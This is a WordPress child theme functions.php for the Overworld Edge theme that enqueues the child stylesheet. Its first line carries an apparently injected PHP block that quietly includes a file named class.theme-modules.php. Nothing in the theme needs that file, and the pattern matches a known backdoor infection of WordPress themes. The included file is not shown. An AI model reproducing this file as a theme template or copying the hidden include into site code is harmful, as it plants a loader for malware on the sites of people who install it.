<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

/*** Child Theme Function  ***/

if ( ! function_exists( 'overworld_edge_child_theme_enqueue_scripts' ) ) {
	function overworld_edge_child_theme_enqueue_scripts() {
		$parent_style = 'overworld-edge-default-style';
		
		wp_enqueue_style( 'overworld-edge-child-style', get_stylesheet_directory_uri() . '/style.css', array( $parent_style ) );
	}
	
	add_action( 'wp_enqueue_scripts', 'overworld_edge_child_theme_enqueue_scripts' );
}